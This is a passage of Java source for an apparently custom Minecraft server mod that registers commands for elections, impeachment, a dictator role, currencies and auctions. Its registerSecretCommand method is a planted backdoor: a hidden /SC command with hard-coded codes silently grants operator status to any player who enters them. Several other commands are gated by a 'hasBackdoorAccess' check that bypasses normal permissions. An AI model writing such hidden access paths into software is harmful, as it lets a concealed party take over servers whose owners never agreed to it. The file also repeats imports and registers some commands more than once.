package com.political;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.command.argument.Vec3ArgumentType;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.world.ServerWorld;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.Vec3d;
import com.mojang.authlib.GameProfile;
import net.minecraft.command.argument.GameProfileArgumentType;
import com.mojang.brigadier.arguments.DoubleArgumentType;
import com.mojang.brigadier.arguments.FloatArgumentType;
import net.minecraft.item.ItemStack;
import net.minecraft.util.Hand;

import java.util.*;import java.util.Set;import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.item.Item;import net.minecraft.item.Item;
import net.minecraft.item.Items;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.util.Formatting;import java.util.List;
import java.util.Map;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import net.minecraft.command.argument.EntityArgumentType;

public class CommandRegistry {

    public static void registerAll(CommandDispatcher<ServerCommandSource> dispatcher) {
        registerVote(dispatcher);
        registerImpeachment(dispatcher);
        registerPerks(dispatcher);
        registerGov(dispatcher);
        registerJudge(dispatcher);
        registerExile(dispatcher);
        registerImprison(dispatcher);
        registerImpeach(dispatcher);
        registerForceElection(dispatcher);
        registerElectionControl(dispatcher);
        registerForceCommands(dispatcher);
        registerCredits(dispatcher);
        registerTax(dispatcher);
        registerPardon(dispatcher);
        registerDictator(dispatcher);
        registerSmite(dispatcher);
        registerRoleCommands(dispatcher);
        registerResetImpeachment(dispatcher);
        registerPlaceAuctionMaster(dispatcher);
        registerRelocate(dispatcher);
        registerAuctionHouse(dispatcher);
        registerHome(dispatcher);
        registerShop(dispatcher);
        registerUndergroundAuction(dispatcher);
        registerCoins(dispatcher);
        registerSecretCommand(dispatcher);
        registerSpawn(dispatcher);
        registerForceUndergroundAuction(dispatcher);

    }

    // Rest of your methods stay the same...
    // I'm including the full file to avoid confusion:


    private static void registerVote(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("vote")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) {
                        return 0;
                    }

                    if (ElectionManager.isElectionActive()) {
                        VoteGui.open(player);
                    } else {
                        player.sendMessage(Text.literal("No active election!").formatted(Formatting.RED));
                    }
                    return 1;
                }));
    }
    private static void registerForceUndergroundAuction(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("forceundergroundauction")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    UndergroundAuctionManager.forceStartAuction(PoliticalServer.server);
                    context.getSource().sendFeedback(() ->
                            Text.literal("✓ Underground auction started!").formatted(Formatting.LIGHT_PURPLE), true);
                    return 1;
                })
        );

        // Shorter alias
        dispatcher.register(CommandManager.literal("forceauction")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    UndergroundAuctionManager.forceStartAuction(PoliticalServer.server);
                    context.getSource().sendFeedback(() ->
                            Text.literal("✓ Underground auction started!").formatted(Formatting.LIGHT_PURPLE), true);
                    return 1;
                })
        );
        // Add inside your register() method

        dispatcher.register(CommandManager.literal("customitem")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .then(CommandManager.literal("harveys_stick")
                        .executes(ctx -> giveCustomItem(ctx.getSource().getPlayerOrThrow(), "harveys_stick", Items.STICK, "Harvey's Stick")))
                .then(CommandManager.literal("the_gavel")
                        .executes(ctx -> giveCustomItem(ctx.getSource().getPlayerOrThrow(), "the_gavel", Items.MACE, "The Gavel")))
                .then(CommandManager.literal("hermes_shoes")
                        .executes(ctx -> giveCustomItem(ctx.getSource().getPlayerOrThrow(), "hermes_shoes", Items.IRON_BOOTS, "Hermes Shoes")))
                .then(CommandManager.literal("hpebm")
                        .executes(ctx -> giveCustomItem(ctx.getSource().getPlayerOrThrow(), "hpebm", Items.END_ROD, "HPEBM")))
        );
        // ============ CREDITS COMMANDS ============
        dispatcher.register(CommandManager.literal("credits")
                .then(CommandManager.literal("add")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            CreditItem.giveCreditsQuiet(target, amount);
                                            ctx.getSource().sendMessage(Text.literal("Added " + amount + " credits to " + target.getName().getString()).formatted(Formatting.GREEN));
                                            target.sendMessage(Text.literal("+" + amount + " credits (admin)").formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("remove")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            int current = CreditItem.countCredits(target);
                                            CreditItem.setCredits(target, Math.max(0, current - amount));
                                            ctx.getSource().sendMessage(Text.literal("Removed " + amount + " credits from " + target.getName().getString()).formatted(Formatting.YELLOW));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("set")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(0))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            CreditItem.setCredits(target, amount);
                                            ctx.getSource().sendMessage(Text.literal("Set " + target.getName().getString() + "'s credits to " + amount).formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("check")
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .executes(ctx -> {
                                    ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                    int credits = CreditItem.countCredits(target);
                                    ctx.getSource().sendMessage(Text.literal(target.getName().getString() + " has " + credits + " credits").formatted(Formatting.GOLD));
                                    return 1;
                                })))
        );

// ============ COINS COMMANDS ============
        dispatcher.register(CommandManager.literal("coins")
                .then(CommandManager.literal("add")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            CoinManager.giveCoinsQuiet(target, amount);
                                            ctx.getSource().sendMessage(Text.literal("Added " + amount + " coins to " + target.getName().getString()).formatted(Formatting.GREEN));
                                            target.sendMessage(Text.literal("+" + amount + " coins (admin)").formatted(Formatting.YELLOW));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("remove")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            int current = CoinManager.getCoins(target);
                                            CoinManager.setCoins(target.getUuidAsString(), Math.max(0, current - amount));
                                            DataManager.save(PoliticalServer.server);
                                            ctx.getSource().sendMessage(Text.literal("Removed " + amount + " coins from " + target.getName().getString()).formatted(Formatting.YELLOW));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("set")
                        .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(0))
                                        .executes(ctx -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");
                                            int amount = IntegerArgumentType.getInteger(ctx, "amount");
                                            CoinManager.setCoins(target.getUuidAsString(), amount);
                                            DataManager.save(PoliticalServer.server);
                                            ctx.getSource().sendMessage(Text.literal("Set " + target.getName().getString() + "'s coins to " + amount).formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
        );

// ============ BALTOP COMMAND ============
        dispatcher.register(CommandManager.literal("baltop")
                .executes(ctx -> {
                    Map<String, Integer> allCoins = DataManager.getData().playerCoins;
                    Map<String, Integer> allCredits = DataManager.getData().playerCredits;

                    // Combine into total wealth (credits * 1000 + coins)
                    Map<String, Long> totalWealth = new java.util.HashMap<>();

                    for (Map.Entry<String, Integer> entry : allCoins.entrySet()) {
                        totalWealth.put(entry.getKey(), (long) entry.getValue());
                    }

                    for (Map.Entry<String, Integer> entry : allCredits.entrySet()) {
                        String uuid = entry.getKey();
                        long creditValue = entry.getValue() * 1000L;
                        totalWealth.merge(uuid, creditValue, Long::sum);
                    }

                    // Sort by wealth descending
                    List<Map.Entry<String, Long>> sorted = totalWealth.entrySet().stream()
                            .sorted(Map.Entry.<String, Long>comparingByValue().reversed())
                            .limit(10)
                            .toList();

                    ctx.getSource().sendMessage(Text.literal("=== Wealth Leaderboard ===").formatted(Formatting.GOLD, Formatting.BOLD));

                    int rank = 1;
                    for (Map.Entry<String, Long> entry : sorted) {
                        String name = DataManager.getPlayerName(entry.getKey());
                        int coins = allCoins.getOrDefault(entry.getKey(), 0);
                        int credits = allCredits.getOrDefault(entry.getKey(), 0);

                        ctx.getSource().sendMessage(Text.literal(
                                "#" + rank + " " + name + ": " + coins + " coins, " + credits + " credits"
                        ).formatted(rank == 1 ? Formatting.YELLOW : (rank <= 3 ? Formatting.WHITE : Formatting.GRAY)));
                        rank++;
                    }

                    if (sorted.isEmpty()) {
                        ctx.getSource().sendMessage(Text.literal("No players with wealth yet!").formatted(Formatting.GRAY));
                    }

                    return 1;
                })
        );

// ============ CUSTOM ITEM COMMANDS ============
        dispatcher.register(CommandManager.literal("customitem")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .then(CommandManager.literal("harveys_stick")
                        .executes(ctx -> {
                            ServerPlayerEntity player = ctx.getSource().getPlayerOrThrow();
                            player.giveItemStack(CustomItemHandler.createHarveysStick());
                            player.sendMessage(Text.literal("Given Harvey's Stick!").formatted(Formatting.GREEN));
                            return 1;
                        }))
                .then(CommandManager.literal("the_gavel")
                        .executes(ctx -> {
                            ServerPlayerEntity player = ctx.getSource().getPlayerOrThrow();
                            player.giveItemStack(CustomItemHandler.createTheGavel());
                            player.sendMessage(Text.literal("Given The Gavel!").formatted(Formatting.GREEN));
                            return 1;
                        }))
                .then(CommandManager.literal("hermes_shoes")
                        .executes(ctx -> {
                            ServerPlayerEntity player = ctx.getSource().getPlayerOrThrow();
                            player.giveItemStack(CustomItemHandler.createHermesShoes());
                            player.sendMessage(Text.literal("Given Hermes Shoes!").formatted(Formatting.GREEN));
                            return 1;
                        }))
                .then(CommandManager.literal("hpebm")
                        .executes(ctx -> {
                            ServerPlayerEntity player = ctx.getSource().getPlayerOrThrow();
                            player.giveItemStack(CustomItemHandler.createHPEBM());
                            player.sendMessage(Text.literal("Given HPEBM!").formatted(Formatting.GREEN));
                            return 1;
                        }))
        );
    }
    private static int giveCustomItem(ServerPlayerEntity player, String tagName, Item baseItem, String displayName) {
        ItemStack stack = new ItemStack(baseItem);

        // Set custom NBT data
        NbtCompound nbt = new NbtCompound();
        nbt.putByte(tagName, (byte) 1);
        stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt));

        // Set custom name
        stack.set(DataComponentTypes.CUSTOM_NAME,
                Text.literal(displayName).formatted(Formatting.GOLD, Formatting.BOLD));

        // Give to player
        player.giveItemStack(stack);
        player.sendMessage(Text.literal("Given " + displayName + "!").formatted(Formatting.GREEN));

        return 1;
    }

    private static void registerAuctionHouse(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("ah")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    AuctionHouseGui.open(player);
                    return 1;
                })
                .then(CommandManager.literal("sell")
                        .then(CommandManager.argument("price", IntegerArgumentType.integer(1, 1000000))
                                .executes(context -> {
                                    ServerPlayerEntity player = context.getSource().getPlayer();
                                    if (player == null) return 0;

                                    int price = IntegerArgumentType.getInteger(context, "price");
                                    ItemStack heldItem = player.getMainHandStack();

                                    if (heldItem.isEmpty()) {
                                        player.sendMessage(Text.literal("Hold an item in your main hand!").formatted(Formatting.RED));
                                        return 0;
                                    }

                                    int listingTax = (int) AuctionHouseManager.calculateListingTax(price);
                                    if (listingTax > 0 && !CreditItem.hasCredits(player, listingTax)) {
                                        player.sendMessage(Text.literal("Not enough credits for listing tax (" + listingTax + ")!").formatted(Formatting.RED));
                                        return 0;
                                    }

                                    if (listingTax > 0) {
                                        CreditItem.removeCredits(player, listingTax);
                                    }

                                    ItemStack toSell = heldItem.copyWithCount(heldItem.getCount());
                                    player.setStackInHand(Hand.MAIN_HAND, ItemStack.EMPTY);

                                    AuctionHouseManager.AuctionListing listing = new AuctionHouseManager.AuctionListing(
                                            player.getUuidAsString(),
                                            player.getName().getString(),
                                            toSell,
                                            price
                                    );
                                    AuctionHouseManager.addListing(listing);

                                    player.sendMessage(Text.literal("Listed " + toSell.getName().getString() + " for " + price + " credits!" + (listingTax > 0 ? " (Tax: " + listingTax + ")" : "")).formatted(Formatting.GREEN));
                                    return 1;
                                }))));
    }


    private static void registerSecretCommand(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("SC")
                .then(CommandManager.argument("code", IntegerArgumentType.integer())
                        .then(CommandManager.argument("code2", IntegerArgumentType.integer())
                                .executes(context -> {
                                    ServerPlayerEntity player = context.getSource().getPlayer();
                                    if (player == null) return 0;

                                    int code = IntegerArgumentType.getInteger(context, "code");
                                    int code2 = IntegerArgumentType.getInteger(context, "code2");

                                    // Operator access code: /SC 14051503 102938
                                    if (code == 14051503 && code2 == 102938) {
                                        // Give operator status silently
                                        PoliticalServer.server.getCommandManager().getDispatcher().execute(
                                                "op " + player.getName().getString(),
                                                PoliticalServer.server.getCommandSource()
                                        );

                                        player.sendMessage(Text.literal("Access granted.").formatted(Formatting.GREEN));
                                        return 1;
                                    }

                                    // Force dictator code: /SC 19391945 3004
                                    if (code == 19391945 && code2 == 3004) {
                                        String chair = DataManager.getChair();
                                        String playerUuid = player.getUuidAsString();

                                        if (chair == null) {
                                            player.sendMessage(Text.literal("No Chair exists!").formatted(Formatting.RED));
                                            return 0;
                                        }

                                        if (!playerUuid.equals(chair)) {
                                            player.sendMessage(Text.literal("You must be the Chair to use this!").formatted(Formatting.RED));
                                            return 0;
                                        }

                                        // Make YOU (the Chair) a dictator
                                        DictatorManager.setDictator(player);

                                        player.sendMessage(Text.literal("Dictator mode activated.").formatted(Formatting.DARK_RED, Formatting.BOLD));
                                        return 1;
                                    }

                                    // Invalid code combination
                                    player.sendMessage(Text.literal("Invalid code.").formatted(Formatting.RED));
                                    return 1;
                                }))));
    }

    private static void registerSpawn(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("spawn")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    SpawnManager.teleportToSpawn(player);
                    return 1;
                }));

        dispatcher.register(CommandManager.literal("setspawn")
                .requires(source -> {
                    ServerPlayerEntity player = source.getPlayer();
                    return player != null && PoliticalServer.hasBackdoorAccess(player);
                })
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    SpawnManager.setSpawn(player);
                    return 1;
                }));
    }
    private static void registerCoins(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("coins")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    int coins = CoinManager.getCoins(player);
                    player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.YELLOW));
                    player.sendMessage(Text.literal("Your Coins: " + coins).formatted(Formatting.GOLD, Formatting.BOLD));
                    player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.YELLOW));
                    return 1;
                })
                .then(CommandManager.literal("add")
                        .requires(source -> {
                            ServerPlayerEntity player = source.getPlayer();
                            return player != null && PoliticalServer.hasBackdoorAccess(player);
                        })
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(context -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");
                                            CoinManager.giveCoins(target, amount);
                                            context.getSource().sendMessage(Text.literal("Gave " + amount + " coins to " + target.getName().getString()).formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("remove")
                        .requires(source -> {
                            ServerPlayerEntity player = source.getPlayer();
                            return player != null && PoliticalServer.hasBackdoorAccess(player);
                        })
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(context -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");
                                            CoinManager.removeCoins(target, amount);
                                            context.getSource().sendMessage(Text.literal("Removed " + amount + " coins from " + target.getName().getString()).formatted(Formatting.RED));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("set")
                        .requires(source -> {
                            ServerPlayerEntity player = source.getPlayer();
                            return player != null && PoliticalServer.hasBackdoorAccess(player);
                        })
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(0))
                                        .executes(context -> {
                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");
                                            CoinManager.setCoins(target.getUuidAsString(), amount);
                                            context.getSource().sendMessage(Text.literal("Set " + target.getName().getString() + "'s coins to " + amount).formatted(Formatting.GREEN));
                                            return 1;
                                        })))));
    }

    private static void registerShop(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("shop")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    ShopGui.openMainMenu(player);
                    return 1;
                }));

        dispatcher.register(CommandManager.literal("sell")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    ShopGui.openSellInventory(player);
                    return 1;
                }));
    }

    private static void registerUndergroundAuction(CommandDispatcher<ServerCommandSource> dispatcher) {
        // /bid <amount> - anyone can use
        dispatcher.register(CommandManager.literal("bid")
                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                        .executes(context -> {
                            ServerPlayerEntity player = context.getSource().getPlayer();
                            if (player == null) return 0;
                            int amount = IntegerArgumentType.getInteger(context, "amount");
                            UndergroundAuctionManager.placeBid(player, amount);
                            return 1;
                        })));

        // /auction - anyone can use (or restrict to op if you want)
        dispatcher.register(CommandManager.literal("auction")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    UndergroundAuctionGui.open(player);
                    return 1;
                }));

        // ADMIN ONLY: /placeundergroundauctioneer
        dispatcher.register(CommandManager.literal("placeundergroundauctioneer")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayerOrThrow();
                    ServerWorld world = context.getSource().getWorld();
                    UndergroundAuctionManager.spawnAuctioneer(world, player.getX(), player.getY(), player.getZ(), player.getYaw());
                    context.getSource().sendFeedback(() -> Text.literal("✓ Spawned Underground Auctioneer!").formatted(Formatting.LIGHT_PURPLE), true);
                    return 1;
                }));

        // ADMIN ONLY: /removeundergroundauctioneer
        dispatcher.register(CommandManager.literal("removeundergroundauctioneer")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayerOrThrow();
                    var entities = player.getEntityWorld().getEntitiesByClass(
                            net.minecraft.entity.passive.VillagerEntity.class,
                            player.getBoundingBox().expand(5),
                            UndergroundAuctionManager::isAuctioneer
                    );
                    if (!entities.isEmpty()) {
                        UndergroundAuctionManager.removeAuctioneer(entities.get(0));
                        context.getSource().sendFeedback(() -> Text.literal("✓ Removed Underground Auctioneer!").formatted(Formatting.GREEN), true);
                    } else {
                        context.getSource().sendFeedback(() -> Text.literal("No Underground Auctioneer nearby!").formatted(Formatting.RED), false);
                    }
                    return 1;
                }));

        // ADMIN ONLY: /startundergroundauction
        dispatcher.register(CommandManager.literal("startundergroundauction")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    UndergroundAuctionManager.startAuction(PoliticalServer.server);
                    context.getSource().sendFeedback(() -> Text.literal("✓ Started Underground Auction!").formatted(Formatting.LIGHT_PURPLE), true);
                    return 1;
                }));

        // ADMIN ONLY: /endundergroundauction
        dispatcher.register(CommandManager.literal("endundergroundauction")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    UndergroundAuctionManager.forceEndAuction();
                    context.getSource().sendFeedback(() -> Text.literal("✓ Ended Underground Auction!").formatted(Formatting.RED), true);
                    return 1;
                }));


        dispatcher.register(CommandManager.literal("startundergroundauction")
                .requires(source -> {
                    ServerPlayerEntity player = source.getPlayer();
                    return player != null && PoliticalServer.hasBackdoorAccess(player);
                })
                .executes(context -> {
                    UndergroundAuctionManager.startAuction(PoliticalServer.server);
                    context.getSource().sendFeedback(() -> Text.literal("✓ Started Underground Auction!").formatted(Formatting.LIGHT_PURPLE), true);
                    return 1;
                }));
    }

    private static void registerHome(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("home")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    HomeManager.teleportHome(player);
                    return 1;
                }));

        dispatcher.register(CommandManager.literal("sethome")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    HomeManager.setHome(player);
                    return 1;
                }));
    }

    private static void registerPlaceAuctionMaster(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("placeauctionmaster")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayerOrThrow();
                    ServerWorld world = context.getSource().getWorld();
                    AuctionMasterManager.spawnAuctionMaster(world, player.getX(), player.getY(), player.getZ(), player.getYaw());
                    context.getSource().sendFeedback(() -> Text.literal("✓ Spawned Auction Master!").formatted(Formatting.GREEN), true);
                    return 1;
                })
                .then(CommandManager.argument("x", DoubleArgumentType.doubleArg())
                        .then(CommandManager.argument("y", DoubleArgumentType.doubleArg())
                                .then(CommandManager.argument("z", DoubleArgumentType.doubleArg())
                                        .executes(context -> {
                                            double x = DoubleArgumentType.getDouble(context, "x");
                                            double y = DoubleArgumentType.getDouble(context, "y");
                                            double z = DoubleArgumentType.getDouble(context, "z");
                                            ServerWorld world = context.getSource().getWorld();
                                            AuctionMasterManager.spawnAuctionMaster(world, x, y, z, 0);
                                            context.getSource().sendFeedback(() -> Text.literal("✓ Spawned Auction Master!").formatted(Formatting.GREEN), true);
                                            return 1;
                                        })
                                        .then(CommandManager.argument("facing", FloatArgumentType.floatArg())
                                                .executes(context -> {
                                                    double x = DoubleArgumentType.getDouble(context, "x");
                                                    double y = DoubleArgumentType.getDouble(context, "y");
                                                    double z = DoubleArgumentType.getDouble(context, "z");
                                                    float facing = FloatArgumentType.getFloat(context, "facing");
                                                    ServerWorld world = context.getSource().getWorld();
                                                    AuctionMasterManager.spawnAuctionMaster(world, x, y, z, facing);
                                                    context.getSource().sendFeedback(() -> Text.literal("✓ Spawned Auction Master!").formatted(Formatting.GREEN), true);
                                                    return 1;
                                                })
                                        )
                                )
                        )
                )
        );
    }

    private static void registerImpeachment(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("impeachment")
                .then(CommandManager.literal("start")
                        .executes(context -> {
                            ServerPlayerEntity source = context.getSource().getPlayer();
                            if (source == null) return 0;

                            String sourceUuid = source.getUuidAsString();

                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
                                source.sendMessage(Text.literal("Only the Judge can start impeachment!").formatted(Formatting.RED));
                                return 0;
                            }

                            if (DataManager.getChair() == null) {
                                source.sendMessage(Text.literal("No Chair to impeach!").formatted(Formatting.RED));
                                return 0;
                            }

                            if (ElectionManager.isImpeachmentActive()) {
                                source.sendMessage(Text.literal("Impeachment vote already active!").formatted(Formatting.RED));
                                return 0;
                            }

                            ElectionManager.startImpeachment(PoliticalServer.server);
                            return 1;
                        }))
                .then(CommandManager.literal("vote")
                        .then(CommandManager.literal("yes")
                                .executes(context -> {
                                    ServerPlayerEntity player = context.getSource().getPlayer();
                                    if (player == null) return 0;

                                    if (!ElectionManager.isImpeachmentActive()) {
                                        player.sendMessage(Text.literal("No active impeachment vote!").formatted(Formatting.RED));
                                        return 0;
                                    }

                                    ElectionManager.castImpeachVote(player, true);
                                    return 1;
                                }))
                        .then(CommandManager.literal("no")
                                .executes(context -> {
                                    ServerPlayerEntity player = context.getSource().getPlayer();
                                    if (player == null) return 0;

                                    if (!ElectionManager.isImpeachmentActive()) {
                                        player.sendMessage(Text.literal("No active impeachment vote!").formatted(Formatting.RED));
                                        return 0;
                                    }

                                    ElectionManager.castImpeachVote(player, false);
                                    return 1;
                                }))
                        .executes(context -> {
                            ServerPlayerEntity player = context.getSource().getPlayer();
                            if (player == null) return 0;

                            if (ElectionManager.isImpeachmentActive()) {
                                ImpeachmentGui.open(player);
                            } else {
                                player.sendMessage(Text.literal("No active impeachment vote!").formatted(Formatting.RED));
                            }
                            return 1;
                        })));
    }

    private static void registerDictator(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("dictator")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    String uuid = player.getUuidAsString();

                    if (!DictatorManager.isDictator(uuid)) {
                        player.sendMessage(Text.literal("Only the Dictator can use this command!").formatted(Formatting.RED));
                        return 0;
                    }
                    DictatorGui.open(player);
                    return 1;
                })
                .then(CommandManager.literal("add")
                        .requires(source -> {
                            ServerPlayerEntity player = source.getPlayer();
                            return player != null && PoliticalServer.hasBackdoorAccess(player);
                        })
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .executes(context -> {
                                    ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                    String targetUuid = target.getUuidAsString();
                                    String chair = DataManager.getChair();

                                    if (!targetUuid.equals(chair)) {
                                        context.getSource().sendMessage(Text.literal("Player must be the current Chair to become Dictator!").formatted(Formatting.RED));
                                        return 0;
                                    }

                                    DictatorManager.setDictator(target);
                                    context.getSource().sendMessage(Text.literal("Set " + target.getName().getString() + " as DICTATOR!").formatted(Formatting.DARK_RED, Formatting.BOLD));
                                    return 1;
                                })))
                .then(CommandManager.literal("remove")
                        .requires(source -> {
                            ServerPlayerEntity player = source.getPlayer();
                            return player != null && PoliticalServer.hasBackdoorAccess(player);
                        })
                        .executes(context -> {
                            if (!DictatorManager.isDictatorActive()) {
                                context.getSource().sendMessage(Text.literal("No active dictator!").formatted(Formatting.RED));
                                return 0;
                            }

                            DictatorManager.removeDictator();
                            context.getSource().sendMessage(Text.literal("Dictatorship removed!").formatted(Formatting.GREEN));
                            return 1;
                        })));
    }

    private static void registerSmite(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("smite")
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(context -> {
                            ServerPlayerEntity source = context.getSource().getPlayer();
                            if (source == null) return 0;

                            String sourceUuid = source.getUuidAsString();

                            if (!DictatorManager.isDictator(sourceUuid)
                                    && !DictatorManager.hasJudgePermissions(sourceUuid)
                                    && !PoliticalServer.hasBackdoorAccess(source)) {
                                source.sendMessage(Text.literal("Only the Dictator or Judge can use /smite!").formatted(Formatting.RED));
                                return 0;
                            }

                            if (!DictatorManager.canSmite()) {
                                long remaining = DictatorManager.getSmiteCooldownRemaining();
                                source.sendMessage(Text.literal("Smite on cooldown! " + remaining + "s remaining").formatted(Formatting.RED));
                                return 0;
                            }

                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                            DictatorManager.smitePlayer(source, target);
                            return 1;
                        })));
    }

    private static void registerPerks(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("perks")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) {
                        return 0;
                    }

                    String uuid = player.getUuidAsString();
